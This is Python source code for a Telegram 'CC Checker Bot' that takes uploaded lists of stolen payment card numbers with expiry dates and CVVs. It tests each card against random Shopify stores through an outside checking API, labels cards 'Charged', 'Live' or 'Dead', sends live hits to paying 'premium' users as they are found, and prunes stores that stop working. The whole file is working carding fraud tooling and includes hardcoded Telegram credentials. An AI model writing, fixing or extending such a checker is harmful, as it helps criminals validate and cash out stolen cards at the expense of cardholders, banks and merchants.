from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime

# Bot Configuration
API_ID = 21124241
API_HASH = 'b7ddce3d3683f54be788fddae73fa468'
BOT_TOKEN = '7840159565:-zN5S6Bc' # Keep your token secret

# File paths
PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'

# Initialize bot
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Store active checking sessions
active_sessions = {}

# Dead site error keywords
DEAD_SITE_ERRORS = [
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'failed', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'HTTPERROR504', 'http error',
    'httperror504', 'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset'
]

def load_premium_users():
    """Load premium users from file"""
    if not os.path.exists(PREMIUM_FILE):
        return []
    with open(PREMIUM_FILE, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def load_sites():
    """Load sites from file"""
    if not os.path.exists(SITES_FILE):
        return []
    with open(SITES_FILE, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def is_premium(user_id):
    """Check if user is premium"""
    premium_users = load_premium_users()
    return str(user_id) in premium_users

def extract_cc(text):
    """Extract CC from text in format: card|month|year|cvv"""
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    """Check if error indicates dead site"""
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in DEAD_SITE_ERRORS)

async def get_bin_info(card_number):
    """Get BIN info from API"""
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

def extract_json_from_response(response_text):
    """Extract JSON from response"""
    if not response_text:
        return None
    
    start_index = response_text.find('{')
    if start_index == -1:
        return None
    
    brace_count = 0
    end_index = -1
    
    for i in range(start_index, len(response_text)):
        if response_text[i] == '{':
            brace_count += 1
        elif response_text[i] == '}':
            brace_count -= 1
            if brace_count == 0:
                end_index = i
                break
    
    if end_index == -1:
        return None
    
    json_text = response_text[start_index:end_index + 1]
    try:
        return json.loads(json_text)
    except json.JSONDecodeError:
        return None

async def check_card(session, card, site):
    """Check a single card against a site using your API"""
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
        
        # API endpoint
        url = f'https://kamalxd.com/web.php?cc={card}&site={site}'
        
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=90)) as response:
            if response.status != 200:
                return {'status': 'Site Error', 'message': f'HTTP ERROR {response.status}', 'card': card, 'retry': True}
            
            response_text = await response.text()
            json_data = extract_json_from_response(response_text)
            
            if not json_data:
                return {'status': 'Site Error', 'message': 'Invalid JSON', 'card': card, 'retry': True}
            
            response_msg = json_data.get('Response', '')
            gateway = json_data.get('Gateway', 'Unknown')
            price = json_data.get('Price', '-')
            
            response_lower = response_msg.lower()
            
            # Check if site is dead
            if is_dead_site_error(response_msg):
                return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}
            
            # Parse response
            if 'cloudflare bypass failed' in response_lower:
                return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gateway, 'price': price}
            elif 'thank you' in response_lower or 'payment successful' in response_lower:
                return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
            
            # --- Corrected "Approved" Logic ---
            elif any(key in response_lower for key in [
                # Standard approved
                'approved', 'success', 
                
                # Insufficient Funds (Live)
                'insufficient_funds', 'insufficient funds', 
                
                # CVV/CVC Errors (Live)
                'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
                'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
                
                # Zip/AVS Errors (Live)
                'incorrect_zip', 'incorrect zip'
            ]):
                return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
            # --- End Correction ---
            
            else:
                return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
                
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def send_realtime_hit(user_id, result, hit_type):
    """Send real-time notification for charged/approved cards"""
    emoji = "💳" if hit_type == "Charged" else "✅"
    
    # Get BIN info
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    
    message = f"{emoji} **{hit_type}!**\n\n"
    message += f"**Card:** `{result['card']}`\n"
    message += f"**Gateway:** {result.get('gateway', 'Unknown')}\n"
    message += f"**Response:** {result['message'][:150]}\n"
    message += f"**Price:** {result.get('price', '-')}\n"
    message += f"**Site:** {result.get('site', 'N/A')}\n\n"
    message += f"**BIN Info:**\n"
    message += f"{brand} - {bin_type} - {level}\n"
    message += f"{bank}\n"
    message += f"{country} {flag}"
    
    try:
        await bot.send_message(user_id, message)
    except:
        pass

async def update_progress(user_id, message_id, results, current_attempt_count):
    """Update progress message"""
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    
    progress_text = f"**Gateway:** Shopify Random Charged\n"
    progress_text += f"**Checked:** {current_attempt_count}/{results['total']}\n"
    progress_text += f"**Charged:** {len(results['charged'])}\n"
    progress_text += f"**Live:** {len(results['approved'])}\n"
    progress_text += f"**Dead:** {len(results['dead'])}\n"
    progress_text += f"**Time:** {hours}h {minutes}m {seconds}s"
    
    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("🛑 Stop", b"stop")]
    ]
    
    try:
        await bot.edit_message(user_id, message_id, progress_text, buttons=buttons)
    except:
        pass

async def send_final_results(user_id, results):
    """Send final results with txt file"""
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    
    summary = f"**Your Results are ready!**\n\n"
    summary += f"**Total:** {results['total']}\n"
    summary += f"**Charged:** {len(results['charged'])}\n"
    summary += f"**Live:** {len(results['approved'])}\n"
    summary += f"**Dead:** {len(results['dead'])}\n"
    summary += f"**Time:** {hours}h {minutes}m {seconds}s\n\n"
    summary += "Results attached below."
    
    # Create result file
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"shopiii_{user_id}_{timestamp}.txt"
    
    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 50 + "\n")
        await f.write("CC CHECKER RESULTS\n")
        await f.write("=" * 50 + "\n\n")
        
        await f.write(f"CHARGED ({len(results['charged'])}):\n")
        await f.write("-" * 50 + "\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        
        await f.write(f"APPROVED ({len(results['approved'])}):\n")
        await f.write("-" * 50 + "\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        
        await f.write(f"DEAD ({len(results['dead'])}):\n")
        await f.write("-" * 50 + "\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
    
    await bot.send_message(user_id, summary, file=filename)
    
    try:
        os.remove(filename)
    except:
        pass

async def test_site(session, site):
    """
    Tests a single site by sending a dummy CC.
    Returns {'site': site, 'status': 'alive'} or {'site': site, 'status': 'dead'}
    """
    # This dummy card is invalid, but it's enough to test the site's response.
    dummy_cc = "5156768940377263|04|28|877" 
    
    # We re-use the check_card function. 
    # If it returns 'retry': True, the site is dead.
    result = await check_card(session, dummy_cc, site)
    
    if result.get('retry'):
        return {'site': site, 'status': 'dead'}
    else:
        # Any other response ('Dead', 'Approved', 'Charged') means the site
        # is reachable and processed the request.
        return {'site': site, 'status': 'alive'}

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    """Start command"""
    await event.reply(
        "**Welcome to CC Checker Bot!**\n\n"
        "**Commands:**\n"
        "• `/chk` - Reply to a .txt file to check cards\n"
        "• `/site` - Check all sites in `sites.txt` and remove dead ones\n\n"
        "**Note:** Only premium users can use this bot.\n"
        "Max 5000 cards per file."
    )

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    """Main check command - BATCH SIZE 100"""
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply("❌ **Access Denied**\n\nOnly premium users can use this bot.")
        return
    
    if not event.reply_to_msg_id:
        await event.reply("❌ Please reply to a .txt file containing cards.")
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply("❌ Please reply to a .txt file.")
        return
    
    sites = load_sites()
    if not sites:
        await event.reply("❌ No sites available. Please contact admin.")
        return
    
    status_msg = await event.reply("⏳ Processing your file...")
    
    file_path = await reply_msg.download_media()
    
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    
    cards = extract_cc(content)
    
    if not cards:
        await status_msg.edit("❌ No valid cards found in file.")
        os.remove(file_path)
        return
    
    if len(cards) > 5000:
        await status_msg.edit(f"⚠️ File contains {len(cards)} cards. Limiting to first 5000 cards.")
        cards = cards[:5000]
    
    os.remove(file_path)
    
    total_cards = len(cards)
    await status_msg.edit(f"🚀 Starting check for {total_cards} cards...")
    
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    
    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0, 
        'start_time': time.time()
    }
    
    retry_queue = []
    current_attempt_count = 0
    batch_size = 100

    try:
        async with aiohttp.ClientSession() as session:
            # --- First Pass (Main List) ---
            for i in range(0, total_cards, batch_size):
                if session_key not in active_sessions:
                    break
                
                session_state = active_sessions[session_key]
                while session_state.get('paused', False):
                    if session_key not in active_sessions:
                        break
                    await asyncio.sleep(1)
                
                if session_key not in active_sessions:
                    break

                batch_cards = cards[i:i + batch_size]
                tasks = []
                for card in batch_cards:
                    site = random.choice(sites)
                    tasks.append(check_card(session, card, site))
                
                batch_results = await asyncio.gather(*tasks)
                current_attempt_count += len(batch_cards)
                
                for result in batch_results:
                    if result.get('retry'):
                        retry_queue.append(result['card'])
                    else:
                        all_results['checked'] += 1
                        if result['status'] == 'Charged':
                            all_results['charged'].append(result)
                            await send_realtime_hit(user_id, result, 'Charged')
                        elif result['status'] == 'Approved':
                            all_results['approved'].append(result)
                            await send_realtime_hit(user_id, result, 'Approved')
                        else:
                            all_results['dead'].append(result)
                
                await update_progress(user_id, status_msg.id, all_results, current_attempt_count)
            
            # --- Retry Pass ---
            if retry_queue and len(sites) > 1 and session_key in active_sessions:
                for i in range(0, len(retry_queue), batch_size):
                    if session_key not in active_sessions:
                        break
                    
                    session_state = active_sessions[session_key]
                    while session_state.get('paused', False):
                        if session_key not in active_sessions:
                            break
                        await asyncio.sleep(1)
                    
                    if session_key not in active_sessions:
                        break

                    batch_cards = retry_queue[i:i + batch_size]
                    tasks = []
                    for card in batch_cards:
                        site = random.choice(sites)
                        tasks.append(check_card(session, card, site))

                    batch_results = await asyncio.gather(*tasks)
                    all_results['checked'] += len(batch_cards)
                    
                    for result in batch_results:
                        if result['status'] == 'Charged':
                            all_results['charged'].append(result)
                            await send_realtime_hit(user_id, result, 'Charged')
                        elif result['status'] == 'Approved':
                            all_results['approved'].append(result)
                            await send_realtime_hit(user_id, result, 'Approved')
                        else:
                            all_results['dead'].append(result)
                    
                    await update_progress(user_id, status_msg.id, all_results, all_results['checked'])

    except Exception as e:
        await bot.send_message(user_id, f"An error occurred: {e}")
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        
        try:
            await status_msg.delete()
        except:
            pass
        
        await send_final_results(user_id, all_results)

@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    """Check all sites and remove dead ones"""
    user_id = event.sender_id
    
    # Only premium users can run this
    if not is_premium(user_id):
        await event.reply("❌ **Access Denied**\n\nOnly premium users can use this command.")
        return
        
    sites = load_sites()
    if not sites:
        await event.reply("❌ `sites.txt` is empty. Nothing to check.")
        return
    
    status_msg = await event.reply(f"🔥 Checking {len(sites)} sites...")
    
    alive_sites = []
    dead_sites = []
    batch_size = 100
    
    try:
        async with aiohttp.ClientSession() as session:
            for i in range(0, len(sites), batch_size):
                batch = sites[i:i + batch_size]
                tasks = [test_site(session, site) for site in batch]
                
                results = await asyncio.gather(*tasks)
                
                for res in results:
                    if res['status'] == 'alive':
                        alive_sites.append(res['site'])
                    else:
                        dead_sites.append(res['site'])
                
                await status_msg.edit(
                    f"🔥 Checking sites...\n\n"
                    f"**Checked:** {len(alive_sites) + len(dead_sites)}/{len(sites)}\n"
                    f"**Alive:** {len(alive_sites)}\n"
                    f"**Dead:** {len(dead_sites)}"
                )
        
        # Rewrite the sites.txt file with only alive sites
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")
                
        summary_msg = f"✅ **Site Check Complete!**\n\n"
        summary_msg += f"**Total Sites:** {len(sites)}\n"
        summary_msg += f"**Alive:** {len(alive_sites)}\n"
        summary_msg += f"**Removed:** {len(dead_sites)}\n\n"
        summary_msg += "`sites.txt` has been updated."
        
        await status_msg.edit(summary_msg)
        
    except Exception as e:
        await status_msg.edit(f"❌ An error occurred during site check: {e}")

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    """Pause checking"""
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer("⏸️ Paused")

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    """Resume checking"""
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer("▶️ Resumed")

# --- THIS IS THE FIX ---
# Removed the incorrect @botVScodeFIX line
@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    """Stop checking"""
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer("🛑 Stopped")
        await event.edit("❌ **Checking stopped by user.**")

print("✅ Bot started successfully!")
bot.run_until_disconnected()